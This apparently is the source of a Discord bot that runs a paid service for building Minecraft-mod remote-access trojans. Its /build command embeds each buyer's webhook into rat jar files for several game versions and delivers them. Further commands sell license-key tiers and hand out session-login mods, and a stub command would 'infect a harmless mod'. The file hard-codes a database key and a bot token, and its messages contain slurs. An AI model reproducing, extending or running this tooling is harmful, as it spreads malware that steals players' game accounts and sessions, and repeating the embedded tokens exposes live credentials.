import os, discord, json, checkwebhook, datetime, newhook, asyncio, uuid
from discord_webhook import DiscordWebhook
from discord.ext import commands

from supabase import create_client, Client, ClientOptions

supabase_url = 'https://nkztkryvdadhtoumcwee.supabase.co'
supabase_key = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5renRrcnl2ZGFkaHRvdW1jd2VlIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MjQ3MTI4ODYsImV4cCI6MjA0MDI4ODg4Nn0.S_4xWFAkVq_P4TaSOi5TvcTdcd919mgufTK1HD8WHoU'
supabase: Client = create_client(supabase_url, supabase_key)

description = """
TGOSG minecraft mod ratting bot
"""

intents = discord.Intents.default()
intents.members = True
intents.message_content = True

bot = commands.Bot(command_prefix='!',intents=intents)

builtfiles = []
cwd = os.getcwd()
data = open("config.json")
config = json.load(data)
token = config["config"]["token"]
allowedServers = [1277737995641950359]

invalidwebhookembed = discord.Embed(title="You added an invalid webhook L", description='Your webhook responded with an error code. Retard!', color=0xff0000)
successembed = discord.Embed(title="Congrats", description="tGoSG Rat has been built", color=0x00ff00)
buildingembed = discord.Embed(description=f"`✅` tGoSG Rat is being built. Please wait about 60 seconds...", color=0x000000)
invalidwebhookembed.add_field(name="It's not that hard to copy a webhook", value="whats harder is to code a r@t.")
successembed.add_field(name="tGoSG Rat has been sent to your direct messages!", value="If you did not recieve one, make sure you allow dms from server members in your servers.")
successembed.set_footer(text="Thank you! Made by Privligedlife / LoliSlayer")
loginsuccess = discord.Embed(title="here you go", description=f"", color=0x00ff00)
invalidversionembed = discord.Embed(title="Invalid Version", description=f"Our versions are **1.19.2, 1.19.4, 1.20.1, and 1.20.4 FABRIC**", color=0xff0000)

LicenseKeys = open("LicenseKeys.txt", "r").read().split("#")
T1LicenseKeys = LicenseKeys[1].split("\n")
T2LicenseKeys = LicenseKeys[2].split("\n")
T3LicenseKeys = LicenseKeys[3].split("\n")
subServerKeys = LicenseKeys[4].split("\n")

async def sendBotLog(msg):
    print(msg)
    channel = bot.get_channel(1277737996090871821)
    await channel.send(msg)    

####BUILD COMMAND####
@bot.slash_command(name="build",description="creates a rat with your webhook")
@discord.option("sendtowebhook", description="Should the rat be sent both here and to your webhook", required=False, default=False, choices=[False, True])
async def build(ctx: commands.Context, webhook: str, sendtowebhook: bool):
    #await ctx.defer(ephemeral=True)
    await sendBotLog(f"[BUILD] attempting to build rat for {ctx.author}")
    print(f"attempting to build rat for {ctx.author}")
    
    if webhook == None or checkwebhook.validatewebhook(webhook) == False:
        await ctx.respond(embed=invalidwebhookembed, ephemeral=True)
        return
    print("valid webhook")
    
    message = await ctx.respond("Starting To Build TGOSG Rat", ephemeral=True)

    webhookID = str(uuid.uuid4())
    webhooksR = supabase.table('webhooks').select("*").eq('DiscordUserID',str(ctx.author.id)).execute().data
    #CHECK IF THIS IS FIRST TIME BUILDING
    if(len(webhooksR) == 0):
        print(f"fist time building")
        supabase.table('userTiers').insert({"DiscordUserName": str(ctx.author), "DiscordUserID": ctx.author.id, "Created hooks": 1, "Allowed max hooks": 3, "Tier 1": 0, "Tier 2": 0, "Tier 3": 0}).execute()
        supabase.table('webhooks').insert({"DiscordUserName": str(ctx.author), "DiscordUserID": ctx.author.id, "Webhook": webhook, "Tier": 0, "webhookID": webhookID}).execute()
        webhooksR = supabase.table('webhooks').select("*").eq('DiscordUserID',str(ctx.author.id)).execute().data
        
        
    #CHECK IF THAT WEBHOOK ALREADY IS BUILD
    userwebhooks = []
    for row in webhooksR:
        userwebhooks.append(row['Webhook'])
        
        
    if(webhook not in userwebhooks):
        #CHECK TO MAKE SURE THE USER CAN BUILD THAT RAT TIER
        userTiersR = supabase.table('userTiers').select("*").eq('DiscordUserID',str(ctx.author.id)).execute().data[0]
        if(userTiersR['Created hooks'] > userTiersR['Allowed max hooks']):
            await ctx.respond(f"you have already created {userTiersR['Created hooks']} rats with diffrent webhooks ", ephemeral=True)
            return
        
        supabase.table('userTiers').update({f'Created hooks': userTiersR['Created hooks'] + 1}).eq("DiscordUserID", ctx.author.id).execute()
        supabase.table('webhooks').insert({"DiscordUserName": str(ctx.author), "DiscordUserID": ctx.author.id, "Webhook": webhook, "Tier": 0, "webhookID": webhookID}).execute()
        print(f"adding to {webhook} database")
    else:
        webhooksR = supabase.table('webhooks').select("*").eq('Webhook',webhook).execute().data[0]
        webhookID = webhooksR['webhookID']
        


    
    for currentVersion in ["1.19.2", "1.20.1", "1.20.4"]:
        newhook.newWebhook(f"{cwd}/rat-{currentVersion}.jar",f"{currentVersion}",webhookID)
                
    await message.edit(embed=successembed, files=[discord.File(f"{cwd}/rat-1.19.2.jar"),discord.File(f"{cwd}/rat-1.20.1.jar"), discord.File(f"{cwd}/rat-1.20.4.jar")])
    if(sendtowebhook):
        senderwebhook = DiscordWebhook(url=webhook)
        for currentVersion in ["1.19.2", "1.20.1", "1.20.4"]:
            with open(f"{cwd}/rat-{currentVersion}.jar", 'rb') as f:
                file_data = f.read() 
            senderwebhook.add_file(file_data, f"rat-{currentVersion}.jar")
        senderwebhook.set_content("Here you go")
        senderwebhook.execute()
        
    await sendBotLog(f"[BUILD] sent rats to {ctx.author}")
    print("sent rats")
        
    for currentVersion in ["1.19.2", "1.20.1", "1.20.4"]:
        os.remove(f"{cwd}/rat-{currentVersion}.jar")
         
   
    with open("logs.txt", "a") as log_file:
        now = datetime.datetime.now()
        dt_string = now.strftime("%D %H:%M:%S")
        log_file.write(f"Built file for {ctx.author}/{ctx.author.id} at {dt_string} Webhook | {webhook}\n")

    now = datetime.datetime.now()
    dt_string = now.strftime("%D %H:%M:%S")
    builtfiles.append(f"Built file for {ctx.author}/{ctx.author.id} at {dt_string}")
    print(f"Built file for {ctx.author}/{ctx.author.id} at {dt_string}")
    
################################# WEBHOOK SHIT #######################################################

### stats ###
@bot.slash_command(name="stats",description="check all your stats")
async def stats(ctx: commands.Context):
    await ctx.defer(ephemeral=True)
    print(f"attempting to check stats for {ctx.author}")
    await sendBotLog(f"[STATS] attempting to check stats for {ctx.author}")
    
    userTiersR = supabase.table('userTiers').select("*").eq('DiscordUserID',str(ctx.author.id)).execute()
    
    createdHooks = -1
    maxHooks = -1
    
    tier1 = -1
    tier2 = -1
    tier3 = -1
    
    for row in userTiersR.data:
        createdHooks = row['Created hooks']
        maxHooks = row['Allowed max hooks']
        
        tier1 = row['Tier 1']
        tier2 = row['Tier 2']
        tier3 = row['Tier 3']
        break
        
    webhooksR = supabase.table('webhooks').select("*").eq('DiscordUserID',str(ctx.author.id)).execute()
    userWebhooks = []
    userWebhookTiers = []
    totalRats = 0
    for row in webhooksR.data:
        userWebhooks.append(row['Webhook'])
        userWebhookTiers.append(row['Tier'])
        totalRats += int(row['Count'])
            
    webhooks = ""
    for i,d in enumerate(userWebhookTiers):
        webhooks = webhooks + "ending in " + userWebhooks[i][-5:] + " has Tier " + str(userWebhookTiers[i]) + "\n"
            
    checkEmbed = discord.Embed(title=f"{ctx.author}'s TGOSG stats", description='this is all your tiers webhooks and total rats', color=0xff0000)
    checkEmbed.add_field(name="Total Tiers",value=f"Tier 1: {tier1}\nTier 2: {tier2}\nTier 3: {tier3}")
    checkEmbed.add_field(name=f"Webhooks (created {createdHooks} out of {maxHooks})",value=webhooks)
    checkEmbed.add_field(name="Total Rats", value=totalRats)
    
    await ctx.respond(embed=checkEmbed, ephemeral=True)

### removewebhooktier ###
@bot.slash_command(name="removewebhooktier",description="remove a tier from a existing webhook")
async def removewebhooktier(ctx: commands.Context, webhook: str):
    await ctx.defer(ephemeral=True)
    print(f"attempting to remove Tier from {webhook[-5:]} for {ctx.author}")
    
    webhooksR = supabase.table('webhooks').select("*").execute()
    for row in webhooksR.data:
        if(row['Webhook'] == webhook):
            if(row['DiscordUserID'] != ctx.author.id):
                await ctx.respond(f"ERM MR MAN THIS ISNT YOUR WEBHOOK", ephemeral=True)
                return
            if(row['Tier'] != 0):
                tier = row['Tier']
                supabase.table('webhooks').update({'Tier': 0}).eq('Webhook',webhook).execute()
                
                existingTier = supabase.table('userTiers').select("*").eq("DiscordUserID", ctx.author.id).execute().data[0]['Tier '+ str(tier)]
                supabase.table('userTiers').update({f'Tier {tier}': existingTier + 1}).eq("DiscordUserID", ctx.author.id).execute()
                await ctx.respond(f"**SUCESS**\nremoved Tier {tier} from webhook ending in " + webhook[-5:] + "\nyou now have " + str(existingTier + 1) + " tiers of this type to use", ephemeral=True)
                break
            else:
                await ctx.respond(f"You can not remove the tier from a tier 0 webhook", ephemeral=True)
                break
            
@bot.slash_command(name="infect",description="infect a harmless mod with our rat")
async def infect(ctx: commands.Context, file: discord.Attachment):
    print("still working on it")
            
    
### applywebhooktier ###
@bot.slash_command(name="applywebhooktier",description="apply a tier to a existing webhook")
async def applywebhooktier(ctx: commands.Context, webhook: str, tier: int):
    await ctx.defer(ephemeral=True)
    print(f"attempting to apply Tier {tier} to {webhook[-5:]} for {ctx.author}")
    await sendBotLog(f"[APPLYWEBHOOK] attempting to apply Tier {tier} to {webhook[-5:]} for {ctx.author}")
    existingTier = supabase.table('userTiers').select("*").eq("DiscordUserID", ctx.author.id).execute().data[0]['Tier '+ str(tier)]
    if(existingTier > 0):
        #has enough tiers to update webhook
        supabase.table('webhooks').update({'Tier': tier}).eq('Webhook',webhook).execute()
        supabase.table('userTiers').update({f'Tier {tier}': existingTier - 1}).eq("DiscordUserID", ctx.author.id).execute()
        await ctx.respond(f"**SUCESS**\nupdated the webhook ending in {webhook[-5:]} to Tier {tier}\nyou now have {existingTier - 1} tiers of this type left", ephemeral=True)
    else:
        await ctx.respond(f"**FAILED**\nyou dont have enough tiers of that type to update your webhook or that webhook already has a tier", ephemeral=True)
    
    
### SHOP UTIL ###
@bot.slash_command(name="license",description="upgrade your tier by buying a license key from our shop")
@discord.option("serverid", description="your reselling serverid", required=False, default=0)
async def license(ctx: commands.Context,license: str,serverid: int):
    await ctx.defer(ephemeral=True)
    print(f"attempting to redeem {license} for {ctx.author}")
    await sendBotLog(f"[LICENSE] attempting to redeem {license} for {ctx.author}")
    
    if(license == "" or license == "\n"):
        await ctx.respond(f"Thats a invalid Key", ephemeral=True)
        return
    
    if(serverid != 0):
        if(license in subServerKeys):
            allowedServers.append(serverid)
            subServerKeys.remove(license)
            await sendBotLog(f"[LICENSE] redeemed {license} for {ctx.author}")
            await ctx.respond(f"**SUCCESS**\nyou have redeemed {license}\n the server with id: {serverid} is now allowed", ephemeral=True)
            
            validKeys = "future\n#"
            for key in T1LicenseKeys:
                validKeys = validKeys + key + "\n"
    
            validKeys = validKeys +"#"
            for key in T2LicenseKeys:
                validKeys = validKeys + key + "\n"
    
            validKeys = validKeys +"#"
            for key in T3LicenseKeys:
                validKeys = validKeys + key + "\n"
          
            validKeys = validKeys +"#"    
            for key in subServerKeys:
                validKeys = validKeys + key + "\n"
                
            open("LicenseKeys.txt","w").write(validKeys)
            return
    
    licenseTier = -1
    if(license in T1LicenseKeys):
        licenseTier = 1
        T1LicenseKeys.remove(license)
        print("Tier 1 Key")
    elif(license in T2LicenseKeys):
        licenseTier = 2
        T2LicenseKeys.remove(license)
        print("Tier 2 Key")
    elif(license in T3LicenseKeys):
        licenseTier = 3
        T3LicenseKeys.remove(license)
        print("Tier 3 Key")
    else:
        print("invalid key")
        await sendBotLog(f"[LICENSE] invalid key {license} for {ctx.author}")
        await ctx.respond(f"Thats a invalid Key", ephemeral=True)
    if(licenseTier != -1):
        await sendBotLog(f"[LICENSE] redeemed {license} for {ctx.author}")
        userInfo = supabase.table('userTiers').select("*").eq("DiscordUserID", ctx.author.id).execute().data[0]
        supabase.table('userTiers').update({f'Tier {licenseTier}': userInfo['Tier '+ str(licenseTier)] + 1}).eq("DiscordUserID", ctx.author.id).execute()
        await ctx.respond(f"**SUCCESS**\nyou have redeemed {license}\n you now have {userInfo['Tier '+ str(licenseTier)] + 1} Tier {licenseTier} to use", ephemeral=True)
        
        validKeys = "future\n#"
        for key in T1LicenseKeys:
            validKeys = validKeys + key + "\n"
    
        validKeys = validKeys +"#"
        for key in T2LicenseKeys:
            validKeys = validKeys + key + "\n"
    
        validKeys = validKeys +"#"
        for key in T3LicenseKeys:
            validKeys = validKeys + key + "\n"
          
        validKeys = validKeys +"#"    
        for key in subServerKeys:
            validKeys = validKeys + key + "\n"
                
        
        open("LicenseKeys.txt","w").write(validKeys)

### USER UTIL ###
@bot.slash_command(name="login",description="login mods")
async def login(ctx: commands.Context):
    await ctx.defer(ephemeral=True)
    print(f"giving login mods to {ctx.author}")
    await ctx.respond(embed=loginsuccess, files=[discord.File(f"{cwd}/loginmod/minecraft-session-login-1.0-1.19.2.jar"),discord.File(f"{cwd}/loginmod/minecraft-session-login-1.0-1.19.4.jar"),discord.File(f"{cwd}/loginmod/minecraft-session-login-1.0-1.20.1.jar")], ephemeral=True)

@bot.event
async def on_command_error(ctx: commands.Context, error: commands.CommandError):
    if isinstance(error, commands.CommandOnCooldown):
        await ctx.send("This command is currently on cooldown.")
    elif isinstance(error, commands.MissingRole):
        await ctx.send("hey. you dont have perms to do that :) you FUCKING retard")
    else:
        raise error

@bot.event
async def on_ready():
    await sendBotLog(f"[STARTUP] Logged in as " + bot.user.name)
    print("Logged in as " + bot.user.name)
    
@bot.event
async def on_guild_join(guild):
    discord_guild = bot.get_guild(int(guild.id))
    channel = discord_guild.text_channels[0]
    invite = await channel.create_invite()
    await sendBotLog(f"bot invite used in guild {guild.name} with id {guild.id} invite: {invite}")
    
    if(guild.id not in allowedServers):
        await sendBotLog(f"bot didnt have guild in in allowedServers")
        await channel.send("please buy a license key from https://tgosg.sellauth.com/ than run /createsubserver to invite our bot")
        to_leave = bot.get_guild(guild.id)
        await to_leave.leave()


async def main():
    async with bot:
        await bot.start("MTI3Nzc2NDM2NzU1MDY0ODQwMw.GOBNeo.HNuAih-2qSI0fkqQNapR1ZYkOU7MJpeAnB549o")


asyncio.run(main())
